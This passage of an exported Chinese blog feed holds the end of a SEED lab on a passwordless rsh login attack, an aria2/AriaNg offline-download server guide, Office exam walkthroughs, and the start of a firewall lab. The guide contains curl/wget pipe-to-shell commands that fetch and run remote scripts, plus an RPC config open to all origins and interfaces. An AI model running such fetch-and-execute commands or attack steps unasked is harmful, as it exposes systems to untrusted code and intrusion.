and no password is needed: 学生需要使用echo命令替换在任务2中的rsh命令，然后重复攻击。如果攻击成功，攻击者应该可以使用以下命令远程登录到X终端并且不需要使用密码： 1$ rsh [X-Terminal’s IP] 7 Submission（投稿）Students need to submit a detailed lab report to describe what they have done, what they have observed, and how they interpret（解释） the results. Reports should include evidences to support the observations（观察）. Evidences include packet traces, screenshots, etc. Reports should also list the important code snippets（片段） with explanations. Simply attaching code without any explanation will not receive credits. 学生需要提交一份细节实验报告来描述他们做了什么，他们有什么样的发现，以及他们是如何解释结果的。报告应该包含证据以支持其观察。证据包含数据包追踪，屏幕截图等等。报告应该列出重要的代码片段及其解释说明。简单的攻击代码同时不包含任何解释将无法获得学分。194/5000 证据包括数据包跟踪，屏幕截图等。报告还应列出重要的代码片段以及说明。 仅附加代码而没有任何解释将不会获得学分。]]></content>
      <categories>
        <category>SEED Labs</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[离线服务器搭建]]></title>
    <url>%2F2020%2F01%2F13%2F%E7%A6%BB%E7%BA%BF%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[我没啥下载需求，就是正好有天看到vps可以用来搭建离线下载服务器，正好手上有台vps那就来搭建试试。 比如在本地下载资源的时候比较慢，有时候要下很久，但是你又需要关机，那么可以让vps服务器先去下载。等vps下完保留在服务器上后，自己再从vps上把资源取出来。 实验环境： 操作系统：CentOS 7.4 CPU：双核 RAM：1624 M 端口带宽：1Gbps，你只需要知道，这个带宽下，下载速度的上限只能是你的网络带宽 技术基础：基本 linux 操作 1.下载安装aria2作为一款极为强大的命令行下载工具，aria2 的身影活跃于各大下载教程中。它支持 HTTP、FTP、BT、磁力等各种下载协议，占用资源少，支持多线程和远程访问，是搭建离线下载服务的不二之选。 若要安装 aria2，只需在终端执行命令 yum -y install aria2 即可。如果提示命令有误的话，可以先执行 yum -y install epel-release，添加 epel 源后再尝试。 为了确认安装成功，你可以输入命令 aria2c -v 查看 aria2 的版本号 安装 aria2 成功后，我们还需要为它编写配置文件。首先执行命令 mkdir ~/.aria2（路径可依喜好更改）创建存放配置的文件夹，随后执行 touch ~/.aria2/aria2.session 创建会话文件。 完成以上操作后，执行 vi ~/.aria2/aria2.conf，按 i 键进入编辑模式，完工后按 Esc 键返回，再按 :wq 保存修改并退出。 在本文中，我提供了一个可直接使用的配置文件样本，你可以粘贴至 aria2.conf 文件内，注意修改 rpc-secret 为自己喜欢的密码。如果在上一步操作中选择了其它文件路径，不要忘了修改哦。 注意：下面的部分端口（如RPC监听端口、BT监听端口、DHT网络监听端口）需要在防火墙上放通。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# 文件的保存路径（可自行修改）dir=/root/Download# 启用磁盘缓存, 0为禁用缓存#disk-cache=32M# 文件预分配方式, 能有效降低磁盘碎片file-allocation=none# 断点续传continue=true# 最大同时下载任务数, 运行时可修改max-concurrent-downloads=5# 同一服务器连接数, 添加时可指定max-connection-per-server=5# 最小文件分片大小, 添加时可指定min-split-size=20M# 单个任务最大线程数, 添加时可指定split=5# 整体下载速度限制, 运行时可修改#max-overall-download-limit=0# 单个任务下载速度限制#max-download-limit=0# 整体上传速度限制, 运行时可修改#max-overall-upload-limit=0# 单个任务上传速度限制#max-upload-limit=0# 禁用IPv6disable-ipv6=true# 从会话文件中读取下载任务input-file=/root/.aria2/aria2.session# 退出时保存`错误/未完成`的下载任务到会话文件save-session=/root/.aria2/aria2.session# 定时保存会话, 0为退出时才保存#save-session-interval=60# 启用RPCenable-rpc=true# 允许所有来源rpc-allow-origin-all=true# 允许非外部访问rpc-listen-all=true# 事件轮询方式, 取值:[epoll, kqueue, port, poll, select]#event-poll=select# RPC监听端口, 端口被占用时可以修改rpc-listen-port=6800# 设置的RPC授权令牌rpc-secret=&lt;token&gt;# 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务#follow-torrent=true# BT监听端口, 当端口被屏蔽时使用listen-port=6881-6999# 单个种子最大连接数#bt-max-peers=55# 打开DHT功能, PT需要禁用enable-dht=true# 打开IPv6 DHT功能, PT需要禁用enable-dht6=true# DHT网络监听端口dht-listen-port=6881-6999# 本地节点查找, PT需要禁用bt-enable-lpd=true# 种子交换, PT需要禁用enable-peer-exchange=true# 每个种子限速#bt-request-peer-speed-limit=50K# 客户端伪装, PT需要peer-id-prefix=-TR2770-user-agent=Transmission/2.77# 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种seed-ratio=1.0# 强制保存会话, 即使任务已经完成#force-save=false# BT校验相关, 默认:true#bt-hash-check-seed=true# 继续之前的BT任务时, 无需再次校验bt-seed-unverified=true# 保存磁力链接元数据为 .torrent 文件bt-save-metadata=true# DHT（IPv4）文件dht-file-path=/root/.aria2/dht.dat# DHT（IPv6）文件dht-file-path6=/root/.aria2/dht6.dat 完成以上操作后，让我们输入 aria2c –conf-path=/root/.aria2/aria2.conf -D，如果没有错误提示的话，aria2 的配置工作就已经大功告成了。你可以使用 aria2c URL 下载指定链接，并在 /root/Download 文件夹中找到离线完成的文件。 为了让 aria2 开机时自动运行，我们可以编辑 vi /etc/rc.d/rc.local，加入 aria2c --conf-path=/root/.aria2/aria2.conf 这一行命令。 2.下载安装AriaNgaria2 虽好，命令行的操作方式却令人望而却步。而 AriaNg 则允许我们在友好的 GUI 界面中使用它，并完整支持原版 aria2 的设置选项，让它像迅雷一样易用。 安装 AriaNg 前，我们需要先准备一款 Web 服务器。 正好这个vps的配置也还行，干脆就安装个宝塔，然后一键安装web服务器 安装方法查看详细教程 &gt;&gt; Centos安装脚本 12&gt; yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh&gt; Ubuntu/Deepin安装脚本 12&gt; wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh&gt; Debian安装脚本 12&gt; wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh&gt; Fedora安装脚本 12&gt; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh&gt; 面板安装完成后，登录进去选择安装一个LAMP环境 安装2个扩展 禁用一个函数 然后重启PHP服务 点击宝塔面板中的“数据库”选项，打开phpmyadmin： 新建一个数据库命名为filerun，如图： 现在来下载FileRun的安装包：http://www.filerun.com/download 注意我们要下载的版本是For PHP 7 or 5.6如图： 将下载到本地的安装包通过宝塔面板上传到你的站点根目录并解压： 打开你的网站域名（注意这里需要有你自己的一个域名，然后再dns服务器上做好了A记录），此时应该能够看到FileRun的安装界面向导了： 如果你是完全按照这篇文章搭建的FileRun那么你的文件存储路径是类似这样的：（注意这里和上面的aria2设置的路径不一致，可以把aria2配置文件中的下载路径修改成下面这个） 1/www/wwwroot/你绑定的站点域名/system/data/default_home_folder 现在正式开始下载AriaNG前端面板，项目地址：https://github.com/mayswind/AriaNg 最新版下载地址：https://github.com/mayswind/AriaNg/releases/download/0.2.0/aria-ng-0.2.0.zip 下载完成后，回到你的宝塔面板中，在你的站点根目录下新建一个目录命名为：aria。进入到这个目录内将AriaNG的安装包上传到这个目录内并解压。 此时在你的站点域名后面加上/aria即可访问到这个面板了。 回到AriaNg面板中，点击AriaNg设置-RPC，在页面中的Aria2 RPC密钥内填写你们自己刚启动Aria2时设置的密码（注意，这是在第一步安装aria2的配置文件里面就设置好的）： 3.Aria2 无法下载磁力链接、BT种子和速度慢的解决方案前言BT 下载并不是一个人的事，比如你在下载一部生理卫生知识教学影片时，背后其实是有一群和你下载同样影片的人在为你上传，同时你也在为他人上传，这个影片下载的人越多，给你上传的人就会越多，速度就会越快。但如果找不到这些人，你就可能无法下载。那么如何才能找到和你下载同样影片的人呢？ 开放端口在未开放端口的情况下，Aria2 无法与外界进行数据交换。所以开放端口是进行 BT 下载的首要条件。 如果是在 VPS 上使用 Aria2 下载，最简单粗暴的办法是关闭防火墙。如果你不想这么做，那么首先要知道端口号，这也许是你自己设置的，也许是默认的，总之打开 Aria2 配置文件就知道了。以下是 Aria2 完美配置中的端口信息： 1234# BT监听端口listen-port=51413# DHT网络监听端口dht-listen-port=6881-6999 知道端口号后让防火墙放行这些端口即可。其实这些步骤在第一步已经弄完了。 添加 BitTorrent trackerBit­Tor­rent tracker 是帮助 BT 协议在节点与节点之间做连接的服务器，俗称 BT 服务器、tracker 服务器（以下简称为 tracker ）。BT 下载一开始就要连接到 tracker ，从 tracker 获得其他客户端 IP 地址后，才能连接到其他客户端下载。在传输过程中，也会一直与 tracker 通信，上传自己的信息，获取其它客户端的信息。所以 tracker 在 BT 下载中起到了至关重要的作用。 每个 BT 种子都会内置 tracker ，但可能因为不可抗力而导致连接困难或者速度不理想，这就意味着很难找到下载相同资源的人。好在这个问题可以通过添加额外 tracker 来解决，这样你遇到和你下载同样资源的人的机会就更多，就更容易找到给你上传的人，速度自然就会快了。 trackerslist 是一个提供 tracker 列表的项目，几乎每天都会更新。列表还分为 udp、http、ws…… 小孩子才做选择，所以直接选择 trackers_all 这个包含所有服务器的列表。然后更改格式，tracker 之间用 , 隔开，再添加到 Aria2 配置文件中，就像下面这样： 123bt-tracker=udp://tracker.coppersurfer.tk:6969/announce,udp://tracker.leechers-paradise.org:6969/announce,udp://tracker.opentrackr.org:1337/announce,udp://9.rarbg.to:2710/announce,udp://9.rarbg.me:2710/announce,udp://tracker.internetwarriors.net:1337/announce,udp://tracker.openbittorrent.com:80/announce,udp://exodus.desync.com:6969/announce,udp://open.demonii.si:1337/announce,udp://tracker.tiny-vps.com:6969/announce 当然这种重复的事情，用脚本来做才是正确的方式： 在终端内执行以下命令可直接获取 Aria2 可用格式的 tracker 列表。 1bash &lt;(curl -fsSL git.io/tracker.sh) cat 在 Aria2 配置文件(aria2.conf)所在目录执行以下命令即可获取最新 tracker 列表并自动转换为 Aria2 可用格式添加到配置文件中。 1bash &lt;(curl -fsSL git.io/tracker.sh) 此外还可以指定配置文件路径，比如配置文件在/root/.aria2/aria2.conf： 1bash &lt;(curl -fsSL git.io/tracker.sh) &quot;/root/.aria2/aria2.conf&quot; 获取 DHT 数据由于 tracker 对 BT 下载起到客户端协调和调控的重要作用，所以一旦被封锁会严重影响 BT 下载。早年中国大陆对 tracker 的封锁，曾一度导致 BT 下载销声匿迹，这也促使了 DHT 网络的诞生。 DHT 网络由无数节点组成，当接触到一个节点，通过这个节点又能接触到更多的节点，接触的节点越多，你获取资源的能力就越强，下载的速度也就越快。即使在完全不连上 Tracker 服务器的情况下，也可以很好的下载。以下是 Aria2 配置文件中一些与 DHT 相关的功能选项：（注：以下内容也在第一步的配置文件中设置好了） 1234567891011121314# DHT（IPv4）文件dht-file-path=/root/.aria2/dht.dat# DHT（IPv6）文件dht-file-path6=/root/.aria2/dht6.dat# 打开DHT功能, PT需要禁用, 默认:trueenable-dht=true# 打开IPv6 DHT功能, PT需要禁用enable-dht6=true# DHT网络监听端口, 默认:6881-6999dht-listen-port=6881-6999# 本地节点查找, PT需要禁用, 默认:falsebt-enable-lpd=true# 种子交换, PT需要禁用, 默认:trueenable-peer-exchange=true 和其他 BT 下载工具一样，Aria2 有个 dht.dat 文件（开启 IPv6 还有个 dht6.dat），里面记录了 DHT 节点信息。但是！文件本身是不存在的，需要手动创建。如果你在 Aria2 第一次运行的时候直接下载磁力链接或者冷门种子，因为文件内没有任何数据，就无法获取到 DHT 网络中的节点，所以就会遇到无法下载的情况。 第一个解决方案是找有数据 DHT 文件。 第二个解决方案是生成 DHT 数据。找几个热门种子下载，比如 Ubuntu 镜像的种子。下载后做种几个小时，你会发现 dht.dat 从空文件变成有数据了。 4.参考文档1.鸭子都能看懂的 VPS 离线下载 &amp; 云服务搭建新手教程 2.Aria2整合FileRun自建离线下载网盘 3.Aria2 无法下载磁力链接、BT种子和速度慢的解决方案 4.一键安装脚本]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[信息处理技术员表格处理真题]]></title>
    <url>%2F2019%2F11%2F20%2F%E4%BF%A1%E6%81%AF%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF%E5%91%98%E8%A1%A8%E6%A0%BC%E5%A4%84%E7%90%86%E7%9C%9F%E9%A2%98%2F</url>
    <content type="text"><![CDATA[信息处理技术员—表格处理真题讲解习题1用Excel创建“销售利润表”（内容如下表所示)，按照题目要求完成后，用Excel 的保存功能直接存盘。 销售商店 进价（元） 销售价（元） 销售量（台） 利润（元） 商店一 2500 30 21000 商店二 3300 16 12000 商店三 2700 3200 20000 商店四 3350 40 24000 商店五 2700 3300 34 商店六 2850 60 18000 商店七 2730 3000 27000 商店八 2750 3190 50 合计 平均利润 要求： 表格要有可视的边框，并将表中的列标题设置为宋体、12磅、加粗、居中；其他内容设置为宋体、12磅、居中。 计算出表格中空白单元格的值，并填入相应的单元格中。 用函数计算出“合计”，并填入相应的单元格中。 用函数计算这八个店的“平均利润”，并填入相应的单元格中。 以“销售商店”和“利润”列为数据区域，插入簇状柱形图。 解答： 表格要有可视的边框 将表中的列标题设置为宋体、12磅、加粗、居中 其他内容设置为宋体、12磅、居中（步骤略，基本类似第2步） 计算出表格中空白单元格的值，并填入相应的单元格中（通过函数求值，下图仅举一例） 用函数计算出“合计” 用函数计算这八个店的“平均利润” 适当调整表格，使之成为题干表格所展示的样子 以“销售商店”和“利润”列为数据区域，插入簇状柱形图 习题2用Excel创建“三好学生评选表”（内容如下表所示)，按照题目要求完成后，用Excel 的保存功能直接存盘。 要求： 表格要有可视的边框，并将表中的内容设置为宋体、10.5磅、居中。 用函数计算数学、语文、英语、物理4科的平均成绩。 用IF函数计算评选结果，其中数学、语文、英语、物理和综合评定大于等于85, 且平均成绩大于等于90的在单元格中显示“三好”，否则单元格不显示任何内容。 用函数统计三好学生的人数。 以姓名列为X轴，数学、英语、语文和物理列为数据区域，制作数据点折线图。 解答： 先按题干给出的表格录入信息 调整文字位置，结合题干表格合并部分单元格（类似步骤可以参考习题1） 添加可视的边框，并将表中的内容设置为宋体、10.5磅、居中（参考习题1），注意字号大小设置的时候，下拉框可能没有10.5磅数值可以给你选择。那么你可以直接在框中，用键盘输入10.5进去 用函数计算数学、语文、英语、物理4科的平均成绩 用IF函数计算评选结果，其中数学、语文、英语、物理和综合评定大于等于85, 且平均成绩大于等于90的在单元格中显示“三好”，否则单元格不显示任何内容（手误输入成“优秀了） 用函数统计三好学生的人数（注意，不能用counta函数，不然会显示出数值是5） 以姓名列为X轴，数学、英语、语文和物理列为数据区域，制作数据点折线图 补充注意 习题3用Excel创建“学生成绩表”和“成绩统计表”后，用Excel的保存功能直接存盘。(内容如下图所示)。 要求： 1.表格要有可视的边框，并将表中的文字设置为宋体、12磅、黑色、居中。 2.用函数计算总分，将计算结果填入对应的单元格中。 3.用函数统计各科、各班的实考人数，无成绩的空白单元格为缺考，将统计结果填入对应的单元格中。 4.用函数计算各科、各班的最高分，将计算结果填入对应的单元格中。 5.用函数计算各科、各班的最低分，将计算结果填入对应的单元格中。 解答： 第一步略，按题干要求录入文字，并设置好格式 用函数计算总分，将计算结果填入对应的单元格中 用函数统计各科、各班的实考人数，将统计结果填入对应的单元格中 （注意，=COUNTIFS(A3:A18,I7,B3:B18,”&lt;&gt;”)中的&lt;&gt;表示非空字符的意思。这种写法会更好） 用函数计算各科、各班的最高分，将计算结果填入对应的单元格中 用函数计算各科、各班的最低分，将计算结果填入对应的单元格中，其实和第4空是类似写法 案例1用Excel创建“汽车销售完成情况表”（内容如图所示）按题目要求完成后，用Excel的保存功能直接存盘。 要求： 为表格绘制蓝色、双线型边框，并将底纹填充为浅黄色。 将表中的文字设置为华文仿宋、黑色、16磅、居中。 根据表中数据，用函数计算“总计”，并填入对应的单元格中。 根据表中数据，用公式计算“环比”增减量，计算结果保留一位小数，并用百分比表示。 根据表中数据，用公式计算“同比”增减量，计算结果保留一位小数，并用百分比表示。 解答： 先按题干要求录入文字 为表格绘制蓝色、双线型边框 将底纹填充为浅黄色（因为在标准色中没有找到浅黄，所以需要在【其他颜色】中找，调色板里面的颜色显示不出字体颜色的文字，所以可能需要自己多测试几次） 用函数计算“总计”，并填入对应的单元格 用公式计算“环比”增减量 用公式计算“同比”增减量 “环比”，“同比”数值用百分比表示，结果保留一位小数 案例2用Excel创建“学生成绩表”（内容如下图所示)。按题目要求完成之后，用Excel的保存功能直接存盘。 要求： 表格要有可视的边框，并将表中的文字设置为宋体、12磅、黑色、居中。 用函数计算每名学生的平均分，计算结果保留2位小数。 用函数计算数学、英语、计算机科目的最高分。 用函数计算数学、英语、计算机科目的最低分。 根据平均分用函数计算学生的等级评定。评定方法是：85-100为优秀，70-84为良好，60-69为及格，0-59为不及格。 解答： 按要求录入文字，同时设置边框和文字（略），右下角边框可以通过【绘图边框】手绘实现 用函数计算每名学生的平均分，计算结果保留2位小数。 用函数计算数学、英语、计算机科目的最高分 用函数计算数学、英语、计算机科目的最低分 根据平均分用函数计算学生的等级评定。评定方法是：85-100为优秀，70-84为良好，60-69为及格，0-59为不及格。函数语句用if多层嵌套 案例3用Excel创建“学生成绩统计表”（内容如下图所示)。按题目要求完成之后，用Excel的保存功能直接存盘。 要求： 表格要有可视的边框，并将表中的文字设置为宋体、12磅、黑色、居中。 将表格标题设置为华文琥珀、18磅、浅蓝；为行标题填充水绿色底纹。 用函数计算总分。 用函数计算平均分，计算结果保留一位小数。 用函数计算等级。等级的计算方法是平均分大于等于85为优，大于等于70且小于85为良，大于等于60且小于70为及格，否则为不及格。 解答： 按要求录入文字，同时设置边框（略） 表格标题设置为华文琥珀、18磅、浅蓝；为行标题填充水绿色底纹（略） 用函数计算总分 用函数计算平均分，计算结果保留一位小数 用函数计算等级。等级的计算方法是平均分大于等于85为优，大于等于70且小于85为良，大于等于60且小于70为及格，否则为不及格]]></content>
      <categories>
        <category>软考</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[信息处理技术员word试题]]></title>
    <url>%2F2019%2F11%2F14%2F%E4%BF%A1%E6%81%AF%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF%E5%91%98word%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[信息处理技术员—文字处理真题讲解案例1利用系统提供的素材，按题目要求完成后，用Word的保存功能直接存盘。 奥林匹克运动会 奥林匹克运动会（英语：Olympic Games）简称“奥运会”，是国际奥林匹克委员会主办的世界规模最大的综合性运动会，每四年一届，会期不超过16日，分为夏季奥运会（奥运会）、夏季残奥会、冬季奥运会（冬奥会）、冬季残奥会、夏季青年奥运会（青奥会）、冬季青年奥运会和特殊奥林匹克运动会（特奥会）。 要求： 将文章标题设置为宋体、二号、加粗、居中；正文设置为仿宋、小四。 将页面设置为横向，纸张宽度21厘米、高度15厘米，页面内容居中对齐。 为正文添加双线条的边框，并设置为红色、3磅。 为正文填充白色、背景1、深色25%底纹。 在正文第一自然段后另起行录入第二段文字：奥运会中，各个国家用运动交流各国文化，以及切磋体育技能，其目的是为了鼓励人们不断进行体育运动。 解答： 先按题目要求录入文字 将文章标题设置为宋体、二号、加粗、居中 正文设置为仿宋、小四，同时注意要设置【首行缩进2字符】 将页面设置为横向，纸张宽度21厘米、高度15厘米 页面内容居中对齐 为正文添加双线条的边框，并设置为红色、3磅 为正文填充白色、背景1、深色25%底纹 在正文第一自然段后另起行录入第二段文字：奥运会中，各个国家用运动交流各国文化，以及切磋体育技能，其目的是为了鼓励人们不断进行体育运动。 案例2用Word软件制作如图所示的“公司签呈”。按题目要求完成后，用Word的保存功能直接存盘。 要求： 利用相关工具绘制如图所示的公司签呈。 将标题设置为楷体、二号、加粗、居中；其他文字设置为宋体、五号。 解答： 先录入表格外的文字，并完成题目中所要求的字体等需求 通过题干中的表格，先数出有多少行。插入一个N行1列的表格（每行中的单元格，我们可以后续再通过拆分单元格的形式获得，所以就先设置1列）。题干中的表格共有7行 再分别给2，3，6，7行进行拆分单元格（注意：下图仅给出了2，3行的拆分方法。6，7行是同理操作） 拆分完成后，可以利用【Alt】+【鼠标】的方式随意移动单元格边框的位置。调整好位置后，再录入文字 案例3利用系统提供的素材，按题目要求完成后，用 Word 的保存功能直接存盘。丽江古城 丽江古城，又名“大研镇”，位于中国西南部云南省的丽江市，坐落在丽江坝中部，玉龙雪山下。它是中国历史文化名城中唯一两个没有城墙的古城之一。丽江古城始建于宋末元初(公元 13 世纪后期)。古城地处云贵高原，海拔 2400 余米，全城面积达 3.8 平方公里，自古就是远近闻名的集市和重镇。 要求: 将文章标题设置为楷体、二号、加粗、居中；正文设置为宋体、小四。 页面设置为横向，纸张宽度 21厘米，高度15厘米，页面内容居中对齐。 为文档添加“大研镇”文字水印，仿宋，半透明，斜式，白色、背景1、深色 25%。 为文档添加页眉，内容为“世界文化与自然遗产”。 在正文第一自然段后另起行录入第二段文字:其中，纳西族占总人口 70%以上， 有30%的居民仍在从事以铜银器制作、皮毛皮革、酿造业为主的传统手工业和商业活动。 解答： 按题干需求录入文字，同时把文章标题设置为楷体、二号、加粗、居中；正文设置为宋体、小四 页面设置为横向，纸张宽度 21厘米，高度15厘米，页面内容居中对齐。（注意，步骤一和步骤二和案例1类似，请自行参考案例1中的设置） 添加“大研镇”文字水印，【白色、背景1、深色 25%是在设置颜色处添加，操作方法同案例1】 添加页眉 按题干要求，再次录入文字。同时注意，不要有多余的回车键 案例4用Word 软件制作如图示的“应聘人员登记表”。按题目要求完成后，用Word的保存功能直接存盘。 要求: 利用相关工具绘制如图示的应聘人员登记表。 将标题设置为楷体、二号、加粗、居中；其他文字设置为宋体、五号。 解答： 先输入表格外的文字（即标题），然后按要求设置字体、字号等。 插入一个8行1列的表格。（每行中的单元格可以后续再逐步拆分） 按题干中给出的图片，给1、2行拆分出9个单元格，3—8行拆分出2个单元格（下图仅列出前2行的拆分方法，后6行拆分方法类似） 移动表格线的位置，按图示操作 合并1、2行的最后两个单元格 再次在表格中录入图示所示文字，并按要求设置好字体等 再按题干图示，稍微对文字的方向做修改（下图中仅举出一例，其他部分依照图示修改） 最后再对表格线做适当调整即可 案例5用Word软件录入以下文字。按题目要求完成后，用Word的保存功能直接存盘。 新时期中共党史阶段划分 《征途》撰文指出，以中共十一届三中全会为标志，我国进入改革开放新时期。新时期党史可划分为四个阶段，之前是一个过渡阶段。1976年10月粉碎“四人帮”至1978年12月党的十一届三中全会召开前为过渡阶段；十一届三中全会至1982年8月党的十二大召开前为拨乱反正和改革开放的起步阶段；1982年9月党的十二大召开至1991年12月为改革开放的全面展开阶段；2001年1月进入新世纪后为全面建设小康社会阶段。 要求： 将文章标题设置为宋体、二号、加粗、居中；正文设置为宋体、小四。 将正文开头的“《征途》”设置为首字下沉，字体为隶书，下沉行数为2。 为正文添加双线条的边框，3磅，颜色设置为红色，底纹填充为灰色-40%。 为文档添加页眉，内容为“新时期中共党史阶段划分”。 解答： 按要求录入文字（图略，参考上述案例题） 将正文开头的“《征途》”设置为首字下沉，字体为隶书，下沉行数为2 为正文添加双线条的边框，3磅，颜色设置为红色，底纹填充为灰色-40% 此时发现问题，首字下沉处的文字已经变样了。所以需要注意的是，我们的顺序必须是先操作第三步，然后再设置首字下沉，那么问题就会解决 为文档添加页眉，内容为“新时期中共党史阶段划分” 补充内容： 如果题干中加大难度，除去上述要求外，还要求设置【分栏】。那么操作步骤如下： 暂时先回退到下图 因为要对该段做分栏，所以就要应用于段落，而不是整篇文档。同时设置分栏 设置分栏后，不能简单给文字添加边框，而是需要添加【文本框】 添加【文本框】后，还需要把文本的【形状填充】改为透明（方法2，或者是改为把文本框置于底层），不然就会遮挡文字 然后再依旧题目需求来修改文本框的边框 案例6用Word软件制作如图示的机构改革示意图。按题目要求完成后，用Word保存。 要求： 利用自选图形绘制如图所示的机构改革示意图。 将示意图中的“重新组建国家能源局”文字设置为宋体、小三、白色、加粗；“国家发展和改革委员会”文字设置为宋体、小四、蓝色、加粗；“不再保留国家电力监管委员会”文字设置为宋体、小四、灰色-50%、加粗；“接受管理”文字字体设置为宋体、小四、红色、加粗；其他文字设置为宋体、小四、白色、加粗。 绘制完成的机构改革示意图的图形、底纹和样式与图示基本一致。 解答： 由于考试中已经不常考，所以只做简要说明 利用【插入】中的【形状】图标来构建题干中需要的图形 堆叠图片，并做相应设置 图片要进行对齐 对于图片的层次，也是可以设置的 闪电形状是有的，所以可以直接插入 而关于电池形状，只是把多个矩形叠加在一起。【形状填充】时，设置不同的底色即可 案例7金砖国家 “金砖国家”最初是指巴西、俄罗斯、印度和中国。因为这四个国家英文首字母组成的“BRIC”一词，其发音与英文的“砖块”非常相似，所以被称为“金砖四国”。2010年2月，“金砖四国”一致商定，吸收南非作为正式成员加入该合作组织，改称为“金砖国家”英文缩写为“BRICS”。目前，金砖国家国土面积占全世界领土面积26%，人口占世界总人口的42%左右。近年来，金砖国家经济总体保持稳定快速增长，成为全球经济增长的引擎。金砖国家国内生产总值约占全球总重20%，贸易额占全球贸易额15%，对全球的经济贡献率约50%。 要求： 将文章标题设置为宋体、二号、加粗、居中；正文设置为宋体、小四。 将正文内容分为两栏，栏间设置分隔线。 为正文添加双线型文本框，粗细为3磅，颜色为红色，并将底纹填充为灰色-40%。 为文档添加页眉，内容为“金砖国家——BRICS”。 解答： 将文章标题设置为宋体、二号、加粗、居中；正文设置为宋体、小四。 将正文内容分为两栏，栏间设置分隔线。 为正文添加双线型文本框，粗细为3磅，颜色为红色，并将底纹填充为灰色-40%。 注意在这里已经说到了文本框，其实就是提醒你使用文本框来设置边框。 3-1.插入文本框 3-2.选中文本框后，设置文本框的边框 3-3.选中文本框后，将文本框拉到合适大小，并将填充颜色设置为灰色（注意，这里是没有40%的选项让你选，所以题目中的这步你无法做出，只能找个类似的替代） 3-4.然后使得文本框衬于文字下方 为文档添加页眉，内容为“金砖国家——BRICS”。鼠标双击如下位置，写上相应文字即可。]]></content>
      <categories>
        <category>软考</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux防火墙探索实验]]></title>
    <url>%2F2019%2F10%2F31%2FLinux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A2%E7%B4%A2%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[参考文档： 1.官方原文档 2.iptables详解 3.在 Ubuntu 中用 UFW 配置防火墙 4.Ufw使用指南 1. OverviewThe learning objective of this lab is for students to gain the insights（眼光，内省力） on how firewalls work by playing with firewall software and implement a simplified（简化的） packet filtering firewall. Firewalls have several types; in this lab, we focus on packet filter. Packet filters inspect（检测） packets, and decide whether to drop or forward a packet based on firewall rules. Packet filters are usually stateless; they filter each packet based only on the information contained in that packet, without paying attention to whether a packet is part of an existing stream of traffic. Packet filters often use a combination（组合） of a packet’s source and destination address, its protocol, and, for TCP and UDP traffic, port numbers. In this lab, students will play with this type of firewall, and also through the implementation of some of the key functionalities, they can understand how firewalls work. Moreover, students will learn how to use SSH tunnels to bypass（绕行，撇开） firewalls. This lab covers the following topics: 本次实验的学习目标是让学生通过接触防火墙软件与实现一个简单的包过滤防火墙，以深入理解防火墙的工作原理。防火墙有几种类型；在本次实验中，我们关注于包过滤防火墙。包过滤器检测数据包，并且基于防火墙规则来决定是丢弃或是转发一个数据包。包过滤器通常来说是无状态的；它们仅基于数据包中包含的信息来过滤每一个数据包，而不关注数据包是否是现有业务流中的一部分。包过滤器经常组合使用一个数据包的源目地址，协议类型，及TCP和UDP流量的端口号。本实验中，学生将接触该类型防火墙，并且实现部分关键功能，他们能理解防火墙是如何工作的。此外，学生将学习如何使用SSH隧道来绕过防火墙。该实验覆盖以下主题： Firewall（防火墙） Netfilter Loadable kernel module（可加载的内核模块） SSH tunnel（SSH隧道） Readings and related topics. Detailed coverage of Firewalls can be found in Chapter 14 of the SEED book, Computer Security: A Hands-on Approach, by Wenliang Du. A related lab is the Firewall Bypassing lab, which shows how to use VPN to bypass firewalls. 阅读及其相关主题。在杜文亮教授的SEED书籍Computer Security: A Hands-on Approach中的14章可以找到关于防火墙的细节。相关实验是防火墙绕行实验，该实验展示了如何使用VPN绕过防火墙。 Lab environment. This lab has been tested on our pre-built Ubuntu 16.04 VM, which can be downloaded from the SEED website. 实验环境。该实验已经在预建的Ubuntu 16.04 VM上通过测试，该VM可以在SEED网页上下载。 2. Lab Tasks实验组2.1 Task 1: Using Firewall2.1 实验1：使用防火墙 Linux has a tool called iptables, which is essentially(实质上) a firewall. It has a nice front end program called ufw. In this task, the objective is to use ufw to set up some firewall policies, and observe the behaviors of your system after the policies become effective. You need to set up at least two VMs, one called Machine A, and other called Machine B. You run the firewall on your Machine A. Basically, we use ufw as a personal firewall. Optionally, if you have more VMs, you can set up a firewall at your router, so it can protect a network, instead of just one single computer. After you set up the two VMs, you should perform the following tasks: Linux有个工具叫iptables，它实质上是个防火墙。它有个很好的前端程序，叫ufw。在该任务中，目标是使用ufw来设置一些防火墙策略，并且在策略生效后观测你系统的行为。你需要设置至少2个VM，一个叫做机器A，而另一个叫做机器B。你在你的机器A上运行防火墙。基本上，我们使用ufw作为一个私人防火墙。（可选），如果你有多个VM，你可以在你的路由器上设置一个防火墙，那么它可以保护你的网络，而不仅仅是一台主机。实验拓扑如下，主机1作为A，主机2作为B。 在你设置了2台VM后，你需要执行以下任务： Prevent A from doing telnet to Machine B. 阻止来自A向B的telnet访问。 查看ufw的状态，可以发现我们还没有开启该服务 123&gt; [11/12/19]seed@VM:~$ sudo ufw status&gt; Status: inactive&gt; 我们可以使用sudo ufw enable来开启 参考命令如下 123456&gt; 默认策略 允许\拒绝\拒绝并提示 [进入\发出\路由 的数据]&gt; ufw [--dry-run] default allow|deny|reject [incoming|outgoing|routed]&gt; &gt; [删除][插入 第 行] 